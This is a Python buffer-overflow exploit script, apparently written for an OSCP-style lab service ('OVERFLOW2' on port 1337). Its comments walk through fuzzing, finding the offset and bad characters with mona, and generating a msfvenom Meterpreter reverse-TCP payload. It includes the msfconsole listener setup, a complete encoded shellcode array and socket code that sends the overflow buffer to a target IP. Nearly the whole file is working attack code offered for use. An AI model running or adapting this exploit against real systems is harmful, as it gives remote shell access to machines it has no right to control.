#!/usr/bin/env python3
# Fuzzing
# Pattern create - msf-pattern_create -l <fuzzed value>
# Setup working dir for mona - !mona config -set workingfolder c:\monalogs\%p
# Find offset - !mona findmsp -distance <fuzzed value>
# Overwrite ESP using 4 Bs
# Find bad chars - !mona bytearray -b "\x00"
# Copy chars and add value to payload
# Compare bad chars to bytearray - !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
# Bad chars - 00 23 24 3c 3d 83 84 ba bb == \x00\x23\x3c\x83\xba
# Redo bytearray and compare unti result is unmodified
# Find jmp address - !mona jmp -r esp -cpb  "\x00\x23\x3c\x83\xba"
# Use jmp address as retn/esp_overwrite
# Create payload - msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.203.180 LPORT=4444 -b '\x00\x23\x3c\x83\xba' EXITFUNC=thread -f c
# Add nops "\x90"
# Replace bytearrays with shell code in payload var
"""
Create listener in msfconsole:
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.203.180
lhost => 192.168.203.180
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
"""

import socket


ip = "192.168.203.166"
port = 1337

prefix = "OVERFLOW2 "
offset = "A" * 634
retn = "\xaf\x11\x50\x62" # 625011AF
padding = "\x90" * 16
payload = (
"\xfc\xbb\xe8\x4e\x67\x9c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x14\xa6\xe8\x9c\xe4"
"\x37\x97\xad\x36\xbe\xb2\xaa\x3d\x93\x0c\xb8\x13\x18\xe6\xec"
"\x87\xab\x8a\x38\xa8\x1c\x20\x1f\x87\x9d\x84\x9f\x4b\x5d\x86"
"\x63\x91\xb2\x68\x5d\x5a\xc7\x69\x9a\x2d\xad\x86\x76\x26\x1f"
"\x49\x20\xb3\xe2\x55\xcf\x13\x69\xe5\xb7\x16\xae\x92\x0b\x19"
"\xff\xd0\xdc\x01\x74\xbe\xfc\x30\x59\x6f\x78\xfb\x29\xac\xb3"
"\x04\x98\x47\x87\x71\x1a\x8e\xd9\x45\xb1\xef\xd5\x48\xcb\x28"
"\xd1\xb2\xbe\x42\x21\x4f\xb9\x90\x5b\x8b\x4c\x07\xfb\x58\xf6"
"\xe3\xfd\x8d\x61\x67\xf1\x7a\xe5\x2f\x16\x7d\x2a\x44\x22\xf6"
"\xcd\x8b\xa2\x4c\xea\x0f\xee\x17\x93\x16\x4a\xf6\xac\x49\x32"
"\xa7\x08\x01\xd1\xbe\x2d\xea\x29\xbf\x73\x7d\xe5\x0d\x8c\x7d"
"\x61\x06\xff\x4f\x2e\xbc\x97\xe3\xa7\x1a\x6f\x75\xaf\x9d\xbf"
"\x3d\xa0\x60\x40\x3e\xe8\xa6\x14\x6e\x82\x0f\x15\xe5\x52\xb0"
"\xc0\x90\x58\x26\x2b\xcc\x96\x02\xc3\x0f\x29\x7b\x48\x99\xcf"
"\x2b\x20\xc9\x5f\x8b\x90\xa9\x0f\x63\xfb\x25\x6f\x93\x04\xec"
"\x18\x39\xeb\x59\x70\xd5\x92\xc3\x0a\x44\x5a\xde\x76\x46\xd0"
"\xeb\x87\x08\x11\x99\x9b\x7c\x46\x61\x64\x7c\xe3\x61\x0e\x78"
"\xa5\x36\xa6\x82\x90\x71\x69\x7d\xf7\x01\x6e\x81\x86\x33\x04"
"\xb7\x1c\x7c\x72\xb7\xf0\x7c\x82\xe1\x9a\x7c\xea\x55\xff\x2e"
"\x0f\x9a\x2a\x43\x9c\x0e\xd5\x32\x70\x99\xbd\xb8\xaf\xed\x61"
"\x42\x9a\x6e\x65\xbc\x58\x58\xce\xd5\xa2\xd8\xee\x25\xc9\xd8"
"\xbe\x4d\x06\xf7\x31\xbe\xe7\xd2\x19\xd6\x62\xb2\xe8\x47\x72"
"\x9f\xad\xd9\x73\x13\x76\xe9\x0e\x5b\x89\x0a\xef\x72\xee\x0a"
"\xef\x7b\x10\x36\x39\x45\x66\x79\xf9\xf2\x69\x64\xd4\x0e\x02"
"\x31\xbd\xb3\x4f\xc2\x6b\xf7\x69\x41\x9e\x87\x8d\x59\xeb\x82"
"\xca\xdd\x07\xfe\x43\x88\x27\xad\x64\x99\x28\x51\x9b\x22\x29"
)
postfix = ""

buffer = prefix + offset + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")